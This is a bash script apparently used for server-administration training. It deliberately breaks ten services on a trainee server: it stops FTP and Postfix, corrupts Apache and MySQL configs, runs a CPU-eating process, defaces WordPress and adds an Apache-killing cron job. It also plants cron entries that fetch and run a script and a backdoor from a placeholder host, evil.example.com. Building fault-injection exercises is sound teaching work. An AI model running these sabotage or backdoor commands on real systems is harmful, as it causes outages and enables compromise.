#!/bin/bash
# Day 14 Break Script — L1 Support Simulation
# Run this on each trainee's server AFTER they complete the 8 setup tasks
# Usage: bash break_day14.sh

echo "======================================"
echo "  Day 14 - Breaking 10 things..."
echo "======================================"

# TICKET 1 - Stop and disable FTP
echo "[1/10] Stopping FTP service..."
systemctl stop vsftpd 2>/dev/null
systemctl disable vsftpd 2>/dev/null

# TICKET 2 - Change Apache DocumentRoot to wrong path
echo "[2/10] Changing Apache DocumentRoot..."
sed -i 's|DocumentRoot /var/www/html|DocumentRoot /var/www/wrong_path|g' /etc/apache2/sites-enabled/000-default.conf 2>/dev/null
systemctl restart apache2 2>/dev/null

# TICKET 3 - Break Postfix and stop it
echo "[3/10] Breaking Postfix config..."
systemctl stop postfix 2>/dev/null
if [ -f /etc/postfix/main.cf ]; then
    sed -i 's/^myhostname.*/myhostname = BROKEN_HOSTNAME/' /etc/postfix/main.cf
fi

# TICKET 4 - Start a CPU-eating process
echo "[4/10] Starting rogue CPU process..."
nohup bash -c 'while true; do :; done' &>/dev/null &
# Rename the process so they can find it
cat > /tmp/cpu_eater.sh << 'ROGUE'
#!/bin/bash
while true; do
    : # eat CPU
done
ROGUE
chmod +x /tmp/cpu_eater.sh
nohup /tmp/cpu_eater.sh &>/dev/null &
# Kill the first background bash loop (keep cpu_eater)
kill %1 2>/dev/null

# TICKET 5 - Deface WordPress index.php
echo "[5/10] Defacing WordPress index.php..."
if [ -f /var/www/html/index.php ]; then
    cp /var/www/html/index.php /var/www/html/index.php.bak
    echo '<html><body><h1>HACKED BY L33T CREW</h1><p>Your site has been pwned!</p></body></html>' > /var/www/html/index.php
fi

# TICKET 6 - Plant malicious cron jobs for www-data
echo "[6/10] Planting malicious cron jobs..."
echo "*/5 * * * * wget -q http://evil.example.com/malware.sh -O /tmp/.hidden.sh && bash /tmp/.hidden.sh
*/10 * * * * curl -s http://evil.example.com/backdoor.php > /var/www/html/wp-content/.backdoor.php" | crontab -u www-data -

# TICKET 7 - Corrupt MySQL config
echo "[7/10] Corrupting MySQL config..."
systemctl stop mysql 2>/dev/null
if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
    echo -e "\n# Corrupted settings\nport = 99999\nmax_connections = -1\ninvalid_setting = broken" >> /etc/mysql/mysql.conf.d/mysqld.cnf
fi

# TICKET 8 - Add cron job that kills Apache every minute
echo "[8/10] Adding Apache killer cron..."
(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/pkill -f apache2 >/dev/null 2>&1") | crontab -

# TICKET 9 - Corrupt WordPress DB tables
echo "[9/10] Corrupting WordPress DB tables..."
# Start MySQL temporarily to corrupt tables
systemctl start mysql 2>/dev/null
sleep 2
# Remove the invalid config lines first so MySQL can start
if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
    sed -i '/^port = 99999/d' /etc/mysql/mysql.conf.d/mysqld.cnf
    sed -i '/^max_connections = -1/d' /etc/mysql/mysql.conf.d/mysqld.cnf
    sed -i '/^invalid_setting = broken/d' /etc/mysql/mysql.conf.d/mysqld.cnf
    sed -i '/^# Corrupted settings/d' /etc/mysql/mysql.conf.d/mysqld.cnf
fi
systemctl restart mysql 2>/dev/null
sleep 2
# Corrupt a table by directly manipulating the file (if possible) or use ALTER
mysql -u root wordpress -e "ALTER TABLE wp_posts ENGINE=MyISAM;" 2>/dev/null
# Now re-add the bad config for ticket 7
echo -e "\n# Corrupted settings\nport = 99999\nmax_connections = -1\ninvalid_setting = broken" >> /etc/mysql/mysql.conf.d/mysqld.cnf
systemctl stop mysql 2>/dev/null

# TICKET 10 - Already handled — UseDNS is set to yes or commented out by default
echo "[10/10] Setting slow SSH login..."
sed -i 's/^UseDNS no/#UseDNS no/' /etc/ssh/sshd_config 2>/dev/null
# Don't restart SSH — that would kick us out and we need DNS broken for the delay effect

echo ""
echo "======================================"
echo "  All 10 issues created!"
echo "======================================"
echo ""
echo "Issues planted:"
echo "  1. FTP service stopped and disabled"
echo "  2. Apache DocumentRoot changed to wrong path"
echo "  3. Postfix stopped + broken hostname in config"
echo "  4. Rogue CPU-eating process running"
echo "  5. WordPress index.php defaced (backup at .bak)"
echo "  6. Malicious cron jobs for www-data user"
echo "  7. MySQL config corrupted (won't start)"
echo "  8. Cron job killing Apache every minute"
echo "  9. WordPress DB tables corrupted"
echo "  10. SSH slow login (UseDNS)"
echo ""
echo "Trainees can now start working on tickets in the portal!"
